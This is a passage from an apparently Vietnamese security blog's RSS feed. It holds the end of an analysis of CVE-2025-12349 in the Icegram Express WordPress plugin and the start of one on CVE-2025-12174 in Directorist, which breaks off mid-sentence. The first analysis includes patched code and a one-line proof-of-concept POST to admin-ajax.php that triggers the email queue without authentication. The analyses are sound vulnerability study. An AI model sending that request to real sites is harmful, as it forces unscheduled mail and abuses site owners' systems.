thi.&lt;/li&gt;&#xA;&lt;li&gt;Truy vấn bảng &lt;code&gt;ig_queue&lt;/code&gt; để lấy các email đã đến thời điểm gửi nhưng chưa được gửi.&lt;/li&gt;&#xA;&lt;li&gt;Gom các bản ghi theo &lt;code&gt;campaign_id&lt;/code&gt; và lấy thông tin contact tương ứng.&lt;/li&gt;&#xA;&lt;li&gt;Với từng contact trong queue, xác định loại email và thực hiện gửi phù hợp.&lt;/li&gt;&#xA;&lt;li&gt;Nếu gửi thành công, xóa bản ghi tương ứng khỏi queue.&lt;/li&gt;&#xA;&lt;li&gt;Dừng xử lý khi đạt giới hạn gửi, gần hết thời gian thực thi hoặc vượt giới hạn bộ nhớ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng phát sinh do không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.&lt;/strong&gt;&#xA;Hàm xử lý được gắn với hook &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;&lt;/strong&gt;, cho phép &lt;strong&gt;người dùng chưa đăng nhập&lt;/strong&gt; gọi trực tiếp endpoint AJAX. Khi callback được thực thi, code &lt;strong&gt;không kiểm tra quyền người dùng&lt;/strong&gt;, &lt;strong&gt;không xác thực nonce&lt;/strong&gt;, dẫn đến việc &lt;strong&gt;bất kỳ ai&lt;/strong&gt; cũng có thể kích hoạt logic nội bộ (cron gửi email), &lt;strong&gt;bỏ qua lịch gửi&lt;/strong&gt;, và &lt;strong&gt;thay đổi trạng thái hệ thống&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v5.9.11)&lt;/strong&gt; khắc phục lỗ hổng bằng cách &lt;strong&gt;bổ sung kiểm soát truy cập và xác thực yêu cầu&lt;/strong&gt; trước khi cho phép kích hoạt cron gửi email.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trigger_mailing_queue_sending() {&#xA;    $can_access_campaign = ES_Common::ig_es_can_access( &amp;#39;campaigns&amp;#39; );&#xA;    $nonce = ig_es_get_request_data( &amp;#39;nonce&amp;#39; );&#xA;    &#xA;    if ( ! $can_access_campaign ) {&#x9;&#xA;        return;&#xA;    } &#xA;&#xA;    if ( empty( $nonce ) || ! wp_verify_nonce( $nonce, &amp;#39;ig-es-trigger-mailing-queue-sending-nonce&amp;#39; ) ) {&#xA;        return;&#xA;    }&#xA;        &#xA;    // Call cron action only when it is not locked.&#xA;    if ( ! ES()-&amp;gt;cron-&amp;gt;is_locked() ) {&#x9;&#x9;&#xA;        // Start processing of campaigns which are scheduled for current date time.&#xA;        do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra quyền (capability check)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$can_access_campaign = ES_Common::ig_es_can_access( &amp;#39;campaigns&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chỉ người dùng có quyền truy cập &lt;strong&gt;campaigns&lt;/strong&gt; mới được phép tiếp tục. Nếu không có quyền → &lt;strong&gt;return&lt;/strong&gt; ngay.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function ig_es_can_access( $page ) {&#xA;    $user = wp_get_current_user();&#xA;&#xA;    if ( ! $user-&amp;gt;exists() ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    $default_permission = &amp;#39;manage_options&amp;#39;;&#xA;&#xA;    $can_access = $user-&amp;gt;has_cap( $default_permission );&#xA;&#xA;    // Is Admin? Have full access.&#xA;    if ( $can_access ) {&#xA;        return true;&#xA;    }&#xA;&#xA;    // We are using this filter in ES Premium to check permission.&#xA;    return apply_filters( &amp;#39;ig_es_can_access&amp;#39;, $can_access, $page );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;strong&gt;&lt;code&gt;ig_es_can_access()&lt;/code&gt;&lt;/strong&gt; dùng để kiểm tra quyền truy cập của người dùng hiện tại. Nếu người dùng &lt;strong&gt;chưa đăng nhập&lt;/strong&gt; thì bị từ chối ngay. Mặc định, chỉ những user có quyền &lt;strong&gt;&lt;code&gt;manage_options&lt;/code&gt;&lt;/strong&gt; (Administrator) mới được phép truy cập. Trường hợp không có quyền này, kết quả sẽ phụ thuộc vào &lt;strong&gt;filter &lt;code&gt;ig_es_can_access&lt;/code&gt;&lt;/strong&gt; để cho phép mở rộng hoặc tùy chỉnh quyền.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xác thực nonce (CSRF protection)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = ig_es_get_request_data( &amp;#39;nonce&amp;#39; );&#xA;wp_verify_nonce( $nonce, &amp;#39;ig-es-trigger-mailing-queue-sending-nonce&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đảm bảo request là hợp lệ và được tạo từ giao diện hợp pháp của WordPress, ngăn việc gọi trực tiếp từ bên ngoài.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Giữ nguyên logic cũ nhưng đặt sau kiểm tra bảo mật&lt;/strong&gt;&#xA;Chỉ sau khi &lt;strong&gt;đã qua kiểm tra quyền và nonce&lt;/strong&gt;, hàm mới kiểm tra &lt;strong&gt;cron lock&lt;/strong&gt; và gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;do_action( &amp;#39;ig_es_cron_worker&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Kết quả: endpoint AJAX &lt;strong&gt;không còn bị lạm dụng bởi người dùng chưa đăng nhập&lt;/strong&gt;, ngăn việc &lt;strong&gt;ép gửi email&lt;/strong&gt;, &lt;strong&gt;bỏ qua lịch&lt;/strong&gt;, và &lt;strong&gt;DoS-like behavior&lt;/strong&gt; như trước.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;] --&amp;gt; B[&amp;#34;Send request to /wp-admin/admin-ajax.php?action=ig_es_trigger_mailing_queue_sending&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_nopriv_ig_es_trigger_mailing_queue_sending hook&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;trigger_mailing_queue_sending() is executed&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Capability check?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;No permission validation&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;Nonce verification?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;No CSRF protection&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;Cron locked?&amp;#34;}&#xA;I -- No --&amp;gt; J[&amp;#34;do_action(&amp;#39;ig_es_cron_worker&amp;#39;)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;process_campaigns()&amp;#34;]&#xA;J --&amp;gt; L[&amp;#34;process_queue()&amp;#34;]&#xA;K --&amp;gt; M[&amp;#34;Force email campaigns to send immediately&amp;#34;]&#xA;L --&amp;gt; N[&amp;#34;Force queued emails to be sent&amp;#34;]&#xA;M --&amp;gt; O[&amp;#34;Bypass schedule &amp;amp; update campaign states&amp;#34;]&#xA;N --&amp;gt; O&#xA;O --&amp;gt; P[&amp;#34;Broken Access Control / Abuse / DoS-like behavior&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gưi request với Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=ig_es_trigger_mailing_queue_sending&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-12349 xuất phát từ việc plugin Icegram Express đăng ký AJAX endpoint với &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; nhưng không thực hiện bất kỳ kiểm tra quyền hay xác thực nonce nào trong hàm &lt;code&gt;trigger_mailing_queue_sending&lt;/code&gt;. Điều này cho phép người dùng chưa đăng nhập kích hoạt trực tiếp cron nội bộ của plugin, dẫn đến việc ép gửi email, bỏ qua lịch gửi, cập nhật trạng thái campaign và gây áp lực không cần thiết lên hệ thống. Bản vá ở phiên bản 5.9.11 đã khắc phục triệt để vấn đề bằng cách bổ sung kiểm tra capability và xác thực nonce trước khi cho phép thực thi logic cron.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ gắn logic nhạy cảm vào &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; mà thiếu kiểm tra quyền.&lt;/li&gt;&#xA;&lt;li&gt;AJAX endpoint trong WordPress luôn phải kết hợp &lt;strong&gt;capability check&lt;/strong&gt; và &lt;strong&gt;nonce verification&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Cron hoặc background process có tác động hệ thống cần được bảo vệ như các hành động quản trị.&lt;/li&gt;&#xA;&lt;li&gt;Broken Access Control có thể dẫn đến lạm dụng chức năng ngay cả khi không rò rỉ dữ liệu trực tiếp.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/email-subscribers/vulnerability/wordpress-email-subscribers-newsletters-plugin-5-9-10-missing-authentication-to-unauthenticated-mailing-queue-trigger-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Email Subscribers &amp;amp; Newsletters Plugin &amp;lt;= 5.9.10 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12174 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-13-cve-2025-12174/</link>
      <pubDate>Sat, 13 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-13-cve-2025-12174/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-13-cve-2025-12174/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Directorist: AI-Powered Business Directory Plugin with Classified Ads Listings&lt;/strong&gt; cho WordPress tồn tại lỗ hổng truy cập trái phép do thiếu kiểm tra quyền hạn đối với các hành động AJAX &lt;code&gt;directorist_prepare_listings_export_file&lt;/code&gt; và &lt;code&gt;directorist_type_slug_change&lt;/code&gt; trong tất cả các phiên bản cho đến &lt;strong&gt;8.5.2&lt;/strong&gt;. Điều này cho phép kẻ tấn công đã xác thực, với quyền &lt;strong&gt;Subscriber trở lên&lt;/strong&gt;, có thể xuất dữ liệu danh sách và thay đổi slug của directorist.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12174&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12174&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 8.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 8.5.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/directorist/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Directorist Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Directorist&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;8.5.2&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;8.5.3&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký hai action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_directorist_prepare_listings_export_file&amp;#39;, [ $this, &amp;#39;handle_prepare_listings_export_file_request&amp;#39; ] );&#xA;add_action( &amp;#39;wp_ajax_directorist_type_slug_change&amp;#39;, [ $this, &amp;#39;directorist_type_slug_change&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Các hook &lt;code&gt;wp_ajax_&lt;/code&gt; chỉ dành cho người dùng đã đăng nhập (từ Subscriber trở lên). Hai action trên gọi đến hai hàm xử lý tương ứng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;1. &lt;code&gt;wp_ajax_directorist_prepare_listings_export_file&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_prepare_listings_export_file_request() {&#xA;    if ( ! directorist_verify_nonce() ) {&#xA;        $data[&amp;#39;success&amp;#39;] = false;&#xA;        $data[&amp;#39;message&amp;#39;] = __( &amp;#39;Something is wrong! Please refresh and retry.&amp;#39;, &amp;#39;directorist&amp;#39; );&#xA;&#xA;        return wp_send_json( $data );&#xA;    }&#xA;&#xA;    $file = Directorist\Listings_Exporter::get_prepared_listings_export_file();&#xA;&#xA;    wp_send_json( $file );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này trả về toàn bộ &lt;strong&gt;Directory Listings&lt;/strong&gt; dưới dạng file &lt;code&gt;.csv&lt;/code&gt;, được tạo bởi hàm &lt;code&gt;get_prepared_listings_export_file()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_prepared_listings_export_file() {&#xA;    $filename      = &amp;#34;listings-export-data&amp;#34;;&#xA;    $file_name     = &amp;#34;{$filename}.csv&amp;#34;;&#xA;    $file_contents = self::get_listings_data_as_csv_content();&#xA;&#xA;    $old_file_id = get_directorist_option( &amp;#39;directorist_export_attachent_id&amp;#39;, &amp;#39;&amp;#39;, true );&#xA;    if ( ! empty( $old_file_id ) ) {&#xA;        wp_delete_attachment( $old_file_id, true );&#xA;    }&#xA;&#xA;    $upload_dir = wp_upload_dir();&#xA;&#xA;    if ( wp_mkdir_p( $upload_dir[&amp;#39;path&amp;#39;] ) ) {&#xA;        $file = $upload_dir[&amp;#39;path&amp;#39;] . &amp;#39;/&amp;#39; . $file_name;&#xA;    } else {&#xA;        $file = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/&amp;#39; . $file_name;&#xA;    }&#xA;&#xA;    file_put_contents( $file, $file_contents );&#xA;&#xA;    $wp_filetype = wp_check_filetype( $file_name, null );&#xA;    $attachment = [&#xA;        &amp;#39;post_mime_type&amp;#39; =&amp;gt; $wp_filetype[&amp;#39;type&amp;#39;],&#xA;        &amp;#39;post_title&amp;#39;     =&amp;gt; sanitize_file_name( $filename ),&#xA;        &amp;#39;post_content&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;inherit&amp;#39;&#xA;    ];&#xA;&#xA;    $attach_id = wp_insert_attachment( $attachment, $file );&#xA;    $attach_url = wp_get_attachment_url( $attach_id );&#xA;&#xA;    update_directorist_option( &amp;#39;directorist_export_attachent_id&amp;#39;, $attach_id );&#xA;&#xA;    return [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;file_url&amp;#39; =&amp;gt; $attach_url ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đường dẫn được trả về chính là giá trị &lt;strong&gt;&lt;code&gt;file_url&lt;/code&gt;&lt;/strong&gt; trong mảng kết quả của 